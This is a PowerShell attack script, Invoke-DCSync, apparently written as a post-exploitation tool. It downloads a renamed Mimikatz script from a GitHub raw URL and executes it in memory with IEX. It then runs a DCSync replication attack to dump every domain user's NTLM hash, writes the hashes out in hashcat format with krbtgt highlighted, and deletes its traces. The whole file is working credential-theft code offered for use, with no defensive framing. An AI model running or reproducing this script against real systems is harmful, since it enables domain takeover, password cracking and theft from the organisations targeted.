Function Invoke-DCSync {

<#
    .SYNOPSIS
        Extracts NTDS.dit hashes from a Domain Controller using the DCSync method via an in-memory Mimikatz.
    .DESCRIPTION
        This function downloads Mimikatz into memory, executes a DCSync attack to retrieve all domain user NTLM hashes,
        and provides the output in a user-friendly format and an optional hashcat-compatible file.
        It requires Domain Admin or equivalent privileges with replication rights.

     .EXAMPLE
        PS > Invoke-DCSync
        Extracts hashes from the current domain.
#>
    param (
        [string]$Domain = $env:USERDNSDOMAIN,
        [string]$OutputToFile = "N",
        [string]$OutputFileName = "Hashcat_Final.txt",
        [string]$OutputFilePath = "$Temp",
        [string]$ComputerHashes = "N"
    )

    # Initialize paths
    $PATH = "$HOME\"
    $LOGFILE = Join-Path $PATH "Log.txt"
    $HASHES = Join-Path $PATH "Hashes.txt"
    $USERS = Join-Path $PATH "Users.txt"
    $HASHCATFILE = Join-Path $PATH "Hashcat.txt"

    # Display header with enhanced formatting
    Write-Host "`n"
    Write-Host "  ╔════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║          DCSync Hash Extraction Tool by dGiri          ║" -ForegroundColor Cyan
    Write-Host "  ╚════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host "  Domain: $Domain" -ForegroundColor White
    if ($ComputerHashes -eq "N") {
        Write-Host "  Note: Computer password hashes are ignored" -ForegroundColor Yellow
    }
    Write-Host "  ───────────────────────────────────────────────────────────" -ForegroundColor Cyan
    Write-Host "`n"

    # Download Mimikatz
    Write-Host "  [*] Downloading Mimikatz into memory..." -ForegroundColor Cyan
    try {
        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/IAMinZoho/Girism/refs/heads/main/Girikatz.ps1')
        Write-Host "  [+] Mimikatz downloaded successfully" -ForegroundColor Green
    } catch {
        Write-Host "  [!] ERROR: Failed to download Mimikatz" -ForegroundColor Red
        Write-Host "      Details: $_" -ForegroundColor Red
        return
    }
    Write-Host "`n"

    # Execute Mimikatz
    Write-Host "  [*] Executing Mimikatz for DCSync..." -ForegroundColor Cyan
    $Command = "`"log $LOGFILE`" `"lsadump::dcsync /domain:$domain /all /csv`""
    try {
        Write-Progress -Activity "Running Mimikatz" -Status "Extracting credentials..." -PercentComplete 50
        Girikatz -Command $Command -ErrorAction Stop | Out-Null
        Write-Progress -Activity "Running Mimikatz" -Status "Completed" -PercentComplete 100 -Completed
        Write-Host "  [+] Mimikatz executed successfully" -ForegroundColor Green
    } catch {
        Write-Host "  [!] ERROR: Mimikatz execution failed" -ForegroundColor Red
        Write-Host "      Details: $_" -ForegroundColor Red
        return
    }
    Write-Host "`n"

    # Verify Mimikatz output
    if (-not (Test-Path $LOGFILE)) {
        Write-Host "  [!] ERROR: Log file missing - Mimikatz failed to create $LOGFILE" -ForegroundColor Red
        return
    }

    $logContent = Get-Content $LOGFILE
    if (-not $logContent -or $logContent -match "ERROR") {
        Write-Host "  [!] ERROR: Mimikatz reported errors" -ForegroundColor Red
        Write-Host "      Check $LOGFILE for details" -ForegroundColor Red
        return
    }

    # Process hashes
    Write-Host "  [*] Processing extracted hashes..." -ForegroundColor Cyan
    try {
        Write-Progress -Activity "Processing Hashes" -Status "Extracting user and hash data..." -PercentComplete 0
        if ($ComputerHashes -eq "Y") {
            $logContent | ForEach-Object { $_.Split("`t")[2] } | Set-Content $HASHES -ErrorAction Stop
            $logContent | ForEach-Object { $_.Split("`t")[1] } | Set-Content $USERS -ErrorAction Stop
        } else {
            $logContent -notmatch '\$' | ForEach-Object { $_.Split("`t")[2] } | Set-Content $HASHES -ErrorAction Stop
            $logContent -notmatch '\$' | ForEach-Object { $_.Split("`t")[1] } | Set-Content $USERS -ErrorAction Stop
        }

        # Verify extracted files
        if (-not (Test-Path $HASHES) -or -not (Test-Path $USERS) -or 
            -not (Get-Content $HASHES) -or -not (Get-Content $USERS)) {
            throw "No valid hashes/users extracted"
        }

        # Build Hashcat file with granular progress
        Write-Progress -Activity "Processing Hashes" -Status "Building Hashcat file..." -PercentComplete 30
        $users = Get-Content $USERS
        $hashes = Get-Content $HASHES
        $totalUsers = $users.Count
        $hashcatContent = for ($i = 0; $i -lt $totalUsers; $i++) {
            $percentComplete = [math]::Round(($i / $totalUsers) * 40) + 30  # Scale 30-70% for this step
            Write-Progress -Activity "Processing Hashes" -Status "Processing user $i of $totalUsers" -PercentComplete $percentComplete
            "$($users[$i]),$($hashes[$i])"
        }
        $hashcatContent | Set-Content $HASHCATFILE -Force

        # Verify Hashcat file
        if (-not (Test-Path $HASHCATFILE)) {
            throw "Hashcat file creation failed"
        }

        Write-Progress -Activity "Processing Hashes" -Status "Completed" -PercentComplete 100 -Completed
        $lineCount = $hashcatContent.Count
        Write-Host "  [+] Successfully extracted $lineCount hashes" -ForegroundColor Green
        Write-Host "`n"

        # Process output
        $finalOutput = $hashcatContent | ForEach-Object {
            $_.Replace(",", "::aad3b435b51404eeaad3b435b51404ee:") + ":::"
        }

        # Display formatted output with krbtgt highlight
        Write-Host "  ───────────────────────────────────────────────────────────" -ForegroundColor Cyan
        Write-Host "  Extracted Hashes:" -ForegroundColor Cyan
        Write-Host ("  {0,-30} {1}" -f "Username", "Hash") -ForegroundColor Yellow
        Write-Host ("  {0,-30} {1}" -f "--------", "----") -ForegroundColor Yellow
        for ($i = 0; $i -lt $users.Count; $i++) {
            if ($users[$i] -eq "krbtgt") {
                Write-Host ("  {0,-30} {1}" -f $users[$i], $hashes[$i]) -ForegroundColor Magenta
            } else {
                Write-Host ("  {0,-30} {1}" -f $users[$i], $hashes[$i]) -ForegroundColor White
            }
        }
        if ($OutputToFile -eq "Y") {
            $finalOutput | Set-Content (Join-Path $PATH $OutputFileName) -Force
            Write-Host "  [+] Output saved to $(Join-Path $PATH $OutputFileName)" -ForegroundColor Green
        }

    } catch {
        Write-Host "  [!] ERROR: Processing failed" -ForegroundColor Red
        Write-Host "      Details: $_" -ForegroundColor Red
    } finally {
        # Cleanup
        Write-Host "`n"
        Write-Host "  [*] Cleaning up temporary files..." -ForegroundColor Cyan
        $filesToRemove = @($LOGFILE, $HASHES, $USERS, $HASHCATFILE)
        foreach ($file in $filesToRemove) {
            if (Test-Path $file) { 
                Remove-Item $file -Force -ErrorAction SilentlyContinue 
            }
        }
        Write-Host "  [+] Cleanup completed" -ForegroundColor Green
    }

    Write-Host "`n"
    Write-Host "  ╔══════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "  ║          DCSync Operation Completed          ║" -ForegroundColor Cyan
    Write-Host "  ╚══════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host "`n"
}